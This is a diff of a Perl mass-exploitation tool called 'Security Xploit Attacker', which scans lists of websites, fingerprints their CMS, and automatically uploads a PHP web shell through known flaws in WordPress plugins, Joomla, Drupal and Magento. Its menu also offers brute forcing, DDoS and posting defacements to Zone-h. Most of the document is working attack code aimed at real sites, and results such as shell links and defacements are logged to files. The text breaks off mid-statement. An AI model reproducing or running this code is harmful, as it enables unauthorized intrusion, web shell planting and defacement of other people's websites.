@@ -2,7 +2,6 @@
 #https://www.facebook.com/ph.hitachi.org
 #Email: ph.hitachi@gmail.com
 #Don't change my right bitches
-#don't copy wihtout credits
 #Publish 02/12/2018
 use if $^O eq "MSWin32", Win32::Console::ANSI;
 use Getopt::Long;
@@ -23,6 +22,7 @@ use HTML::Entities;
 my $ua = LWP::UserAgent->new;
 $ua->timeout(10);
 main:;
+
 system(($^O eq 'MSWin32') ? 'cls' : 'clear');
 system("title DISCLAMER");
 print "\n              	    ";
@@ -36,7 +36,7 @@ print " for attacking ";
 print "[";
 print colored ("!",'red');
 print "]\n";
-print "              	    "; 
+print "              	    ";
 print " targets without prior mutual consient is illagal.\n";
 print "              	    ";
 print "      It is the end User's Responsibility\n";
@@ -64,48 +64,50 @@ main();
 else {
 goto main;
 };
-banner:;
 $au = LWP::UserAgent->new();
 $au->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
 $au->timeout(10);
+menu:;
 sub main(){
 system(($^O eq 'MSWin32') ? 'cls' : 'clear');
+my $datetime    = localtime();
 system("title Security Xploit Attacker v2.5");
 print color('green');
-my $datetime    = localtime;
-$banner="           
+print q{
                       .                                                      .
                     .n                   .                 .                  n.
               .   .dP                  dP                   9b                 9b.    .
              4    qXb         .       dX                     Xb       .        dXp     t
-            dX.    9Xb      .dXb    __       [Ph.Hitachi]      __    dXb.     dXP     .Xb
+            dX.    9Xb      .dXb    __      [ Ph.Hitachi ]     __    dXb.     dXP     .Xb
             9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
              9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
               `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
                 `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
                     ~~~~~~~       9X.    0     .db|db.     0    .XP       ~~~~~~~
-                                   8b.     .dbodP'89b.odb.     .d8
-                                  ,dXXXXXXXXXXXb  8  dXXXXXXXXXXXb.
+                                   8b.     .dbodP'8'9bodb.     .d8
+                                  ,dXXXXXXXXXXXb  8  dXXXXXXXXXXXb,
                                  dXXXXXXXXXXXP'   8   '9XXXXXXXXXXXb
                                 dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                                 9XXbXXXXXb.dX     |     Xb.dXXXXXdXXP
-                                         9XXXXXX(___)XXXXXXP      
+                                         9XXXXXX(___)XXXXXXP
                                         xXXXXX X.'v'.X XXXXXx
-                                            XXXbb   ddXXX
-                                           x.X         X.x
-                                          b'             'd      
+                      ______                XXXbb   ddXXX                            
+                     /     /               x.X   _ _   X.x
+                    /  ___/               b'    (_) |    'd
+                    \     \  ___  ___ _   _ _ __ _| |_ _   _   v2.5
+                     \___  \/ _ \/ __| | | | '__| |  _| | | |  
+                     /     /  __/ (__| |_| | |  | | \_| |_| |
+                    /_____/ \___|\___|'._.'|_|  |_|\__|\__, |_ _
+                                     \  \ /  /       _  __/ (_) |
+                                      \  V  /  _ __ | ||___/| | |_  
+                                       >   <  | '_ \| |/ _ \| |  _|
+                                      /  .  \ | |_) | | (_) | | \_ 
+                                     /__/ \__\| .__/|_|\___/|_|\__|
+                                              | |       
+                                              |_|                                        
 
-";
-print $banner;
+};
 print color('reset');
-print "                      	            ";
-print colored("[+]",'green on_blue');
-print colored("Security Xploit Xploit v1.0",'red on_cyan');
-print colored("[+]\n",'green on_blue');
-print "              	                         ";
-print colored("[+]",'green on_blue'); 
-print colored ("Coded By Ph.hitachi",'white on_red');
-print colored("[+]\n",'green on_blue');
 print "              	                 ";
 print colored("[+]",'green on_blue');
 print colored ("Start At $datetime",'white on_cyan'),"";
@@ -119,7 +121,7 @@ print color("green" ), "\t[";print color("white"),"01";print color("green"),"]";
 print color("green" ), "\t[";print color("white"),"02";print color("green"),"]";print color("red"),"No\n";
 print color("green" ), "\t[";print color("white"),"03";print color("green"),"]";print color("yellow"),"Help\n";
 print color("green" ), "\t[";print color("white"),"04";print color("green"),"]";print color("green"),"Grab Site[ Dorking ] \n";
-print color("green" ), "\t[";print color("white"),"05";print color("green"),"]";print color("blue"),"Website Etractor\n";
+print color("green" ), "\t[";print color("white"),"05";print color("green"),"]";print color("blue"),"Website Extractor\n";
 print color("green" ), "\t[";print color("white"),"06";print color("green"),"]";print color("red"),"Admin Page Finder\n",;
 print color("green" ), "\t[";print color("white"),"07";print color("green"),"]";print color("yellow"),"FTP Scanner\n",;
 print color("green" ), "\t[";print color("white"),"08";print color("green"),"]";print color("green"),"SQL injection scanner\n",;
@@ -131,15 +133,16 @@ print color("green" ), "\t[";print color("white"),"13";print color("green"),"]";
 print color("green" ), "\t[";print color("white"),"14";print color("green"),"]";print color("red"),"Exploit Joomla only\n";
 print color("green" ), "\t[";print color("white"),"15";print color("green"),"]";print color("yellow"),"Exploit OpenCart only\n";
 print color("green" ), "\t[";print color("white"),"16";print color("green"),"]";print color("green"),"Shells Finder [ WSO Shell ]\n";
-print color("green" ), "\t[";print color("white"),"17";print color("green"),"]";print color("blue"),"IP Generator\n";
-print color("green" ), "\t[";print color("white"),"18";print color("green"),"]";print color("red"),"List Sites to IP\n";
-print color("green" ), "\t[";print color("white"),"19";print color("green"),"]";print color("green"),"Reverse IP [ Get site from IP ] \n";
-print color("green" ), "\t[";print color("white"),"20";print color("green"),"]";print color("blue"),"DDos Attack\n";
-print color("green" ), "\t[";print color("white"),"21";print color("green"),"]";print color("red"),"Zone-h [poster]\n";
-print color("green" ), "\t[";print color("white"),"22";print color("green"),"]";print color("red"),"Exit\n";
-print color("green" ), "\t>";print color("white"),">";print color("green"),">   ";
+print color("green" ), "\t[";print color("white"),"17";print color("green"),"]";print color("red"),"File Upload Checker\n";
+print color("green" ), "\t[";print color("white"),"18";print color("green"),"]";print color("blue"),"IP Generator\n";
+print color("green" ), "\t[";print color("white"),"19";print color("green"),"]";print color("red"),"List Sites to IP\n";
+print color("green" ), "\t[";print color("white"),"20";print color("green"),"]";print color("green"),"Reverse IP [ Get site from IP ] \n";
+print color("green" ), "\t[";print color("white"),"21";print color("green"),"]";print color("blue"),"DDos Attack\n";
+print color("green" ), "\t[";print color("white"),"22";print color("green"),"]";print color("red"),"Zone-h [poster]\n";
+print color("green" ), "\t[";print color("white"),"23";print color("green"),"]";print color("red"),"Install && Update [TERMUX]\n";
+print color("green" ), "\t[";print color("white"),"24";print color("green"),"]";print color("red"),"Exit\n";
+print color("green" ), "@";print color("red"),"SecurityXploit";print color("green"),"~";print color("white")," #";
 print color ('reset');
-
 $item=<STDIN>;
 chomp $item;
 }
@@ -153,26 +156,25 @@ $list=<STDIN>;
 chomp $list;
 }
 if($item eq '2'){
-system("dork.pl");
-}if($item eq '3' )
-{
+system("perl dork.pl");
+}if($item eq '3' ){
 getdork();
 }if($item eq '4'){
 grabsitedork();
 }if($item eq '5'){
 websitegrabber();
 }if($item eq '6'){
-system("ftp_scanner.py");
+system("admin.py");
 }if($item eq '7'){
-system("ftp_scanner.py");
+system("python ftp_scanner.py");
 }if($item eq '8'){
 system("sqli.py");
 }if($item eq '9'){
 system("fli.pl");
 }if($item eq '10'){
-system("wpbrute.pl");
+system("perl wpbrute.pl");
 }if($item eq '11'){
-system("BFv1.pl -l brute.txt -p pass.txt");
+system("perl BFv1.pl -l brute.txt -p pass.txt");
 }if($item eq '12'){
 scanwordpress();
 }if($item eq '13'){
@@ -190,15 +192,19 @@ listtoip();
 }if($item eq '19'){
 revip();
 }if($item eq '20'){
-system("DDos.pl")
+system("perl DDos.pl")
 }if ($item eq '21'){
-system("zone.pl");
-}if ($item eq '22'){
+system("perl zone.pl");
+}if($item eq '22'){
+updated();
+}if($item eq '23'){
+uploader();
+}if ($item eq '24'){
 print color ("red")," Good Bye";
 exit;
 }
 $a = 0;
-open (SITE, "<$list") || die "[-] Can't open the list websites file";
+open (SITE, "<$list") || die "[-] Can't open the file";
 @SITE = <SITE>;
 close SITE;
 $link=$#TARGETS + 1;
@@ -234,7 +240,7 @@ print color('bold white'),"] $site ";
 print color("bold green"), "WordPress\n";
 print color('reset');
 open(TEXT, '>>CMS/joomla.txt');
-print TEXT "$site\n";   
+print TEXT "$site\n";
 close(TEXT);
 wpinstallcheck();
 revslider();
@@ -315,9 +321,9 @@ print color('bold white'), " [";
 print color('bold green'),"$a";
 print color('bold white'),"] $site ";
 print color("bold green"), "Joomla\n";
-print color('reset'); 
+print color('reset');
 open(TEXT, '>>CMS/Joomla.txt');
-print TEXT "$site\n"; 
+print TEXT "$site\n";
 close(TEXT);
 comjdownloads();
 comjdownloadsdef();
@@ -383,7 +389,7 @@ print color('bold white'),"] $site ";
 print color("bold green"),"DruPal\n\n";
 print color('reset');
 open(TEXT, '>>CMS/Drupal.txt');
-print TEXT "$site\n";   
+print TEXT "$site\n";
 close(TEXT);
 drupal();
 drupalgeddon();
@@ -394,7 +400,7 @@ print color('bold white'),"] $site ";
 print color("bold green"), "Prestashop\n\n";
 print color('reset');
 open(TEXT, '>>CMS/Prestashop.txt');
-print TEXT "$site\n";   
+print TEXT "$site\n";
 close(TEXT);
 columnadverts();
 soopamobile();
@@ -424,7 +430,7 @@ tdpsthemeoptionpanel();
 psmodthemeoptionpanel();
 masseditproduct();
 }elsif($cms =~/Log into Magento Admin Page|name=\"dummy\" id=\"dummy\"|Magento/) {
-print color('bold white'),"[-] $site";	
+print color('bold white'),"[-] $site";
 print color("bold green"), " - Magento\n\n";print color('reset');
 open(TEXT, '>>sites/Magento.txt');
 print TEXT "$site\n";
@@ -432,14 +438,14 @@ close(TEXT);
 magento();
 }
 elsif($content =~/route=product|OpenCart|route=common|catalog\/view\/theme/) {
-print color('bold white'),"[-] $site";	
+print color('bold white'),"[-] $site";
 print color("bold white"), " - OpenCart\n\n";print color('reset');
 open(TEXT, '>>sites/vbulletin.txt');
 print TEXT "$site\n";
 close(TEXT);
 opencart();
 }elsif($content =~/<meta name="description" content="vBulletin Forums" \/>|<meta name="generator" content="vBulletin" \/>|vBulletin.version =|"baseurl_core":/){
-print color('bold white'),"[-] $site";	
+print color('bold white'),"[-] $site";
 print color("bold green"), " - vBulletin\n\n";print color('reset');
 open(TEXT, '>>sites/vbulletin.txt');
 print TEXT "$site\n";
@@ -452,7 +458,7 @@ print color('bold white'),"] $site ";
 print color("bold green"), "Lokomedia\n\n";
 print color('reset');
 open(TEXT, '>>CMS/lokomedia.txt');
-print TEXT "$site\n";   
+print TEXT "$site\n";
 close(TEXT);
 lokomedia();
 }elsif($lokomedia2 =~/lokomedia/) {
@@ -462,28 +468,29 @@ print color('bold white'),"] $site ";
 print color("bold green"), "Lokomedia\n\n";
 print color('reset');
 open(TEXT, '>>CMS/lokomedia.txt');
-print TEXT "$site\n";   
+print TEXT "$site\n";
 close(TEXT);
 lokomedia();
 }else{
 print color('bold white'), " [";
 print color('bold green'),"$a";
 print color('bold white'),"] $site ";
-print color("bold green"), "Unknown\n\n"; 
+print color("bold green"), "Unknown\n\n";
 open(TEXT, '>>CMS/Unknown.txt');
-print color('reset'); 
-print TEXT "$site\n";   
+print color('reset');
+print TEXT "$site\n";
 close(TEXT);
 }
 }
-#  _____                         _ 
+
+#  _____                         _
 # |  __ \                       | |
 # | |  | |_ __ _   _ _ __   __ _| |
 # | |  | | '__| | | | '_ \ / _` | |
 # | |__| | |  | |_| | |_) | (_| | |
 # |_____/|_|   \__,_| .__/ \__,_|_|
-#                   | |            
-#                   |_|           
+#                   | |
+#                   |_|
 ################ Drupal  Exploit #####################
 
 sub Drupal(){
@@ -496,7 +503,7 @@ print color('bold green'),"+";
 print color('bold red'),"] ";
 print color('bold white'),"Drupal  ........................... ";
 
-# check the link of the exploit or you can download script from here : https://pastebin.com/wPAbtyJ4 and you upload it on you one shell :) 
+# check the link of the exploit or you can download script from here : https://pastebin.com/wPAbtyJ4 and you upload it on you one shell :)
 $drupalink = "http://localhots/drup.php";
 my $exploit = "$drupalink?url=$site&submit=submit";
 my $checkk = $ua->get("$exploit")->content;
@@ -556,15 +563,15 @@ print color('bold white')," ...................... ";
 print color('bold red'),"NOT VULN\n\n";
 }
 }
-#  __  __                        _        
-# |  \/  |                      | |       
-# | \  / | __ _  __ _  ___ _ __ | |_ ___  
-# | |\/| |/ _` |/ _` |/ _ \ '_ \| __/ _ \ 
+#  __  __                        _
+# |  \/  |                      | |
+# | \  / | __ _  __ _  ___ _ __ | |_ ___
+# | |\/| |/ _` |/ _` |/ _ \ '_ \| __/ _ \
 # | |  | | (_| | (_| |  __/ | | | || (_) |
-# |_|  |_|\__,_|\__, |\___|_| |_|\__\___/ 
-#                __/ |                    
-#               |___/        
-             
+# |_|  |_|\__,_|\__, |\___|_| |_|\__\___/
+#                __/ |
+#               |___/
+
 ################ Magento Exploit #####################
 
 sub magento(){
@@ -604,14 +611,14 @@ print  "NOT VULN\n";
 
 
 ################ Wordpress Exploits #####################
-#                 ______            
-#                |  ____|           
-# __      ___ __ | |__  __  ___ __  
-# \ \ /\ / / '_ \|  __| \ \/ / '_ \ 
+#                 ______
+#                |  ____|
+# __      ___ __ | |__  __  ___ __
+# \ \ /\ / / '_ \|  __| \ \/ / '_ \
 #  \ V  V /| |_) | |____ >  <| |_) |
-#   \_/\_/ | .__/|______/_/\_\ .__/ 
-#          | |               | |    
-#          |_|               |_|    
+#   \_/\_/ | .__/|______/_/\_\ .__/
+#          | |               | |
+#          |_|               |_|
 #########################################################
 
 ############### Revshell  ####################
@@ -648,7 +655,7 @@ print "[Success]\n";
 
     open(TEXT, '>>Result/shell.txt');
     print TEXT "$site/wp-content/plugins/revslider/temp/update_extract/revslider/Xploit.php\n";
-    close(TEXT); 
+    close(TEXT);
 	$def = "$site/ph.hitachi.html";
 	zoneh();
     } else {  }
@@ -664,7 +671,7 @@ print color('bold white'),"[Uploading Shell] ................... ";
 print "[Success]\n";
     print color('reset');    open(TEXT, '>>Result/shell.txt');
     print TEXT "$site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/Xploit.php\n";
-    close(TEXT); 
+    close(TEXT);
     	$def = "$site/ph.hitachi.html";
 	zoneh();
 
@@ -682,7 +689,7 @@ print color('bold white'),"[Uploading Shell] ................... ";
 print "[Success]\n";
     print color('reset');    open(TEXT, '>>Result/shell.txt');
     print TEXT "$site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/Xploit.php\n";
-    close(TEXT); 
+    close(TEXT);
 		$def = "$site/ph.hitachi.html";
 	zoneh();
 
@@ -700,7 +707,7 @@ print color('bold white'),"[Uploading Shell] ................... ";
 print "[Success]\n";
     print color('reset');    open(TEXT, '>>Result/shell.txt');
     print TEXT "$site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/Xploit.php\n";
-    close(TEXT); 
+    close(TEXT);
 		$def = "$site/ph.hitachi.html";
 	zoneh();
 
@@ -718,7 +725,7 @@ print color('bold white'),"[Uploading Shell] ................... ";
 print "[Success]\n";
     print color('reset');    open(TEXT, '>>Result/shell.txt');
     print TEXT "$site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/Xploit.php\n";
-    close(TEXT); 
+    close(TEXT);
 		$def = "$site/ph.hitachi.html";
 	zoneh();
 
@@ -736,7 +743,7 @@ print color('bold white'),"[Uploading Shell] ................... ";
 print "[Success]\n";
     print color('reset');    open(TEXT, '>>Result/shell.txt');
     print TEXT "$site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/Xploit.php\n";
-    close(TEXT); 
+    close(TEXT);
 		$def = "$site/ph.hitachi.html";
 	zoneh();
 
@@ -754,7 +761,7 @@ print color('bold white'),"[Uploading Shell] ................... ";
 print "[Success]\n";
     print color('reset');    open(TEXT, '>>Result/shell.txt');
     print TEXT "$site/wp-content/themes/centum/revslider/temp/update_extract/revslider/Xploit.php\n";
-    close(TEXT); 
+    close(TEXT);
 		$def = "$site/ph.hitachi.html";
 	zoneh();
 
@@ -772,7 +779,7 @@ print color('bold white'),"[Uploading Shell] ................... ";
 print "[Success]\n";
     print color('reset');    open(TEXT, '>>Result/shell.txt');
     print TEXT "$site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/Xploit.php\n";
-    close(TEXT); 
+    close(TEXT);
 		$def = "$site/ph.hitachi.html";
 	zoneh();
 
@@ -790,7 +797,7 @@ print color('bold white'),"[Uploading Shell] ................... ";
 print "[Success]\n";
     print color('reset');    open(TEXT, '>>Result/shell.txt');
     print TEXT "$site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/Xploit.php\n";
-    close(TEXT); 
+    close(TEXT);
 		$def = "$site/ph.hitachi.html";
 	zoneh();
 
@@ -808,7 +815,7 @@ print "[Success]\n";
 
     open(TEXT, '>>Result/shell.txt');
     print TEXT "$site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/Xploit.php\n";
-    close(TEXT); 
+    close(TEXT);
 		$def = "$site/ph.hitachi.html";
 	zoneh();
 
@@ -827,7 +834,7 @@ print color('bold white'),"[Uploading Shell] ................... ";
 print "[Success]\n";
     print color('reset');    open(TEXT, '>>Result/shell.txt');
     print TEXT "$site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/Xploit.php\n";
-    close(TEXT); 
+    close(TEXT);
 		$def = "$site/ph.hitachi.html";
 	zoneh();
 
@@ -847,7 +854,7 @@ print "[Success]\n";
     print color('reset');
     open(TEXT, '>>Result/shell.txt');
     print TEXT "$site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/Xploit.php\n";
-    close(TEXT); 
+    close(TEXT);
 		$def = "$site/ph.hitachi.html";
 	zoneh();
 
@@ -865,7 +872,7 @@ print color('bold white'),"[Uploading Shell] ................... ";
 print "[Success]\n";
     print color('reset');    open(TEXT, '>>Result/shell.txt');
     print TEXT "$site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/Xploit.php\n";
-    close(TEXT); 
+    close(TEXT);
 		$def = "$site/ph.hitachi.html";
 	zoneh();
 
@@ -911,7 +918,7 @@ print color('bold red'),"NOT VULN";
 print color('bold white'),"\n";}
 }
 
-################ Blaze #####################  
+################ Blaze #####################
 sub blaze(){
 my $url = "$site/wp-admin/admin.php?page=blaze_manage";
 my $blazeres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["Xploit.php"], task => 'blaze_add_new_album', album_name => '', album_desc => '',]);
@@ -947,12 +954,12 @@ print color('bold white'),"\n";
 ################ Job_Manager #####################
 
  sub mods(){
- 
+
 my $gh = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
 $gh->timeout(10);
 $gh->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
-   
-   
+
+
 $files="Xploit.gif";
 $jdup= $site . '/jm-ajax/upload_file';
 $checkgif= $site . "/wp-content/uploads/job-manager-uploads/company_logo/$year/$month/Xploit.gif";
@@ -973,7 +980,7 @@ print color('bold white'),"";
 print color('bold green'),"VULN";
 print color('bold white'),"\n";
 print color("bold white"),("[Upload Successfully] ==> $site/wp-content/uploads/job-manager-uploads/company_logo/2017/06/Xploit.gif\n");
-print color 'reset';                 
+print color 'reset';
         open (TEXT, '>>Result/uploaded.txt');
 		print TEXT "[LINK] => $site/wp-content/uploads/job-manager-uploads/company_logo/2017/06/Xploit.gif\n";
         close (TEXT);
@@ -1020,7 +1027,7 @@ open(TEXT, '>>Result/mh-wiss.txt');
     close(TEXT);
 }
 
-else { 
+else {
 print color('bold red'),"[";
 print color('bold green'),"+";
 print color('bold red'),"] ";
@@ -1151,7 +1158,7 @@ $ua->timeout (10);
 $link = $site."/wp-content/plugins/formcraft/file-upload/server/php/";
 my $conte = $ua->get("$link")->content;
 if ($conte =~/{"files"/){
-   
+
     upform();
 }else{
     print color('bold red');
@@ -1165,15 +1172,15 @@ print  "NOT VULN\n";
 sub upform(){
 {
 my $url = "$site/wp-content/plugins/formcraft/file-upload/server/php/";
-my $picture ="Xploit.php"; 
+my $picture ="Xploit.php";
 my $field_name = "files[]";
 
 my $response = $ua->post( $url,
             Content_Type => 'form-data',
             Content => [ $field_name => ["$picture"] ]
-           
+
             );
-$upzzX = $site. '/wp-content//plugins//formcraft//file-upload//server//php//files//Xploit.php'; 
+$upzzX = $site. '/wp-content//plugins//formcraft//file-upload//server//php//files//Xploit.php';
 my $taz = $ua->get("$upzzX")->content;
 if ($taz =~ /X Xploit/){
    print color('bold green');
@@ -1185,8 +1192,8 @@ print color('bold green'),"] ";
 print color('bold white'),"Shell Uploaded Successfully\n";
 print color('bold white'),"  [LINK] => $upzzX?X=Xploit\n";
 
-open(TEXT, '>>Result/shell.txt');   
-print TEXT "$upzzX Xploit\n";   
+open(TEXT, '>>Result/shell.txt');
+print TEXT "$upzzX Xploit\n";
 close(TEXT);
 }else{
     print color('bold red');
@@ -1234,7 +1241,7 @@ print color('bold white'),"\n";
 }
 }
 ################ Power Zoomer #####################
-sub powerzoomer(){ 
+sub powerzoomer(){
 my $url = "$site/wp-admin/admin.php?page=powerzoomer_manage";
 
 my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["Xploit.php"], task => 'pwz_add_new_album', album_name => '', album_desc => '',]);
@@ -1398,8 +1405,8 @@ print color('bold red'),"] ";
 print color('bold white'),"Revslider Get Config";
 print color('bold white')," .............. ";
 print color('bold green'),"VULN\n";
-     open(TEXT, '>>Result/Configrev.txt');   
-    print TEXT "[RevsliderConfig] $url\n";   
+     open(TEXT, '>>Result/Configrev.txt');
+    print TEXT "[RevsliderConfig] $url\n";
     close(TEXT);
     getcpconfig();
 }else{
@@ -1495,8 +1502,8 @@ print "VULN";
 print color('reset');
 print color('bold white');
 print color('reset');
-    open(TEXT, '>>Result/Try manual.txt');   
-    print TEXT "[rev cnfg] $site\n";   
+    open(TEXT, '>>Result/Try manual.txt');
+    print TEXT "[rev cnfg] $site\n";
     close(TEXT);
 $resp = $ua->request(HTTP::Request->new(GET => $conflink ));
 $cont = $resp->content;
@@ -1565,10 +1572,10 @@ $cpuplink = "$site/$cpup";
 $resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
 $cont = $resp->content;
 if($cont =~ m/user=/g){
-    open(TEXT, '>>Result/Try_Manual.txt');   
-    print TEXT "[rev cpnl] $site\n";   
+    open(TEXT, '>>Result/Try_Manual.txt');
+    print TEXT "[rev cpnl] $site\n";
     close(TEXT);
-	
+
 $resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
 $contt = $resp->content;
 while($contt =~ m/user/g){
@@ -1627,8 +1634,8 @@ print " \n";
 my $checkajx= $ua->get("$def")->content;
 if($checkajx =~/Hacked|Xploit|ph.hitachi/) {
 
-open(TEXT, '>>Result/index.txt');   
-print TEXT "[rev deface] $site\n";   
+open(TEXT, '>>Result/index.txt');
+print TEXT "[rev deface] $site\n";
 close(TEXT);
 print color('bold red'),"[";
 print color('bold green'),"+";
@@ -1650,7 +1657,7 @@ print color('bold green');
 print "TEXTD";
 print color('reset');
 print color('bold white');
-print color('reset'); 
+print color('reset');
 print " \n";
 zoneh();
 }
@@ -1666,7 +1673,7 @@ print color('bold red');
 print "NOT VULN";
 print color('reset');
 print color('bold white');
-print color('reset'); 
+print color('reset');
 print " \n";
 
 }
@@ -1848,7 +1855,7 @@ print color('bold red'),"NOT VULN\n";
 }
 
 ################ Simple Ads Manager #####################
-sub ads(){  
+sub ads(){
 my $url = "$site/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php";
 
 my $adsres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [uploadfile => ["Xploit.php"], action => 'upload_ad_image', path => '',]);
@@ -1878,7 +1885,7 @@ print color('bold red'),"NOT VULN\n";
 }
 
 ################ Slide Show Pro #####################
-sub slideshowpro(){ 
+sub slideshowpro(){
 my $url = "$site/wp-admin/admin.php?page=slideshowpro_manage";
 
 my $slideshowres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["Xploit.php"], task => 'pro_add_new_album', album_name => '', album_desc => '',]);
@@ -1913,14 +1920,14 @@ print color('bold red'),"NOT VULN\n";
 ##############################################################################################
 # check the link of the shell or you can upload "wpmobiledetectorshell.zip" on you one shell #
 ##############################################################################################
-sub wpmobiledetector(){ 
+sub wpmobiledetector(){
 $wpmdshell = "wpmobiledetectorshell.zip";
 $url = "$site/wp-content/plugins/wp-mobile-detector/resize.php?src=$wpmdshell";
 $wpmdup="$site/wp-content/plugins/wp-mobile-detector/cache/Xploit.php";
 
-my $check = $ua->get("$url"); 
+my $check = $ua->get("$url");
 
-my $checkup = $ua->get("$wpmdup")->content; 
+my $checkup = $ua->get("$wpmdup")->content;
 if($checkup =~/X Xploit/) {
 print color('bold red'),"[";
 print color('bold green'),"+";
@@ -1982,7 +1989,7 @@ print color('bold red'),"NOT VULN\n";
 }
 
 ################ InBoundio Marketing #####################
-sub inboundiomarketing(){ 
+sub inboundiomarketing(){
 my $url = "$site/wp-content/plugins/inboundio-marketing/admin/partials/csv_uploader.php";
 $inbomarketingup = "$site/wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/Xploit.php";
 my $inbomarketingres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["Xploit.php"],]);
@@ -2015,7 +2022,7 @@ print color('bold red'),"NOT VULN\n";
 
 
 ################ dzs-zoomsounds #####################
-sub dzszoomsounds(){ 
+sub dzszoomsounds(){
 my $url = "$site/wp-content/plugins/dzs-zoomsounds/admin/upload.php";
 $dzsup = "$site/wp-content/plugins/dzs-zoomsounds/admin/upload/Xploit.php";
 my $dzsres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file_field => ["Xploit.php"],]);
@@ -2046,7 +2053,7 @@ print color('bold red'),"NOT VULN\n";
 }
 
 ################ reflex-gallery #####################/
-sub reflexgallery(){ 
+sub reflexgallery(){
 my $url = "$site/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=$year&Month=$month";
 $reflexup = "$site/wp-content/uploads/$year/$month/Xploit.php";
 my $reflexres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["Xploit.php"],]);
@@ -2110,7 +2117,7 @@ my $body = $ua->post( $izo,
         Content => $index
         );
 my $checkfoxupx = $ua->get("$site/components/com_b2jcontact/uploads/Xploit.php")->content;
-if ($checkfoxupx =~ /X Xploit/) {	
+if ($checkfoxupx =~ /X Xploit/) {
 print color('bold red'),"Shell Uploaded Successfully\n";
 print color('bold green'),"[ShellLink] => $site/components/com_b2jcontact/uploads/Xploit.php\n";
 		    print color('reset');
@@ -2123,7 +2130,7 @@ print color('bold green'),"+";
 print color('bold red'),"] ";
 print color('bold white'),"B2j Contact";
 print color('bold white')," ....................... ";
-print color('bold red'),"NOT VULN\n";			
+print color('bold red'),"NOT VULN\n";
 }
 }
 }
@@ -2150,11 +2157,11 @@ print color('bold red'), "Testing Vuln $url - \n";
     if($cms =~ s/$regex//){
 	my $bid = $1;
     print color("bold red"), "Bid no: $1\n";
-}	
+}
 my @filesx = ('/index.php?option=com_b2jcontact&amp;view=loader&amp;owner=component&amp;id='.$out.'&amp;bid='.$bid.'&amp;root=&type=uploader&&owner=component&id='.$out.'&qqfile=586cfc73826e4-/../Xploit.php','/index.php?option=com_b2jcontact&view=loader&type=uploader&owner=component&bid=1&id=138&Itemid=138&qqfile=586cfc73826e4-/../Xploit.php','/index.php?option=com_b2jcontact&view=loader&type=uploader&owner=component&bid='.$bid.'&id='.$out.'&Itemid='.$out.'&qqfile=586cfc73826e4-/../Xploit.php','/index.php/component/b2jcontact/loader/module/'.$out.'/components/b2jcontact/'.$bid.'&qqfile=586cfc73826e4-/../Xploit.php','/component/b2jcontact/loader/module/'.$out.'/components/b2jcontact/'.$bid.'&qqfile=586cfc73826e4-/../Xploit.php','index.php?option=com_b2jcontact&view=loader&type=uploader&owner=component&bid=1&id=138&Itemid=138&qqfile=586cfc73826e4-/../Xploit.php','/index.php/contact/loader/component/'.$out.'/components/b2jcontact/1&qqfile=586cfc73826e4-/../Xploit.php');
 OUTER: foreach my $vulx(@filesx){
- my $izo = $site . $vulx; 
-		print color('reset');		
+ my $izo = $site . $vulx;
+		print color('reset');
 my $index='
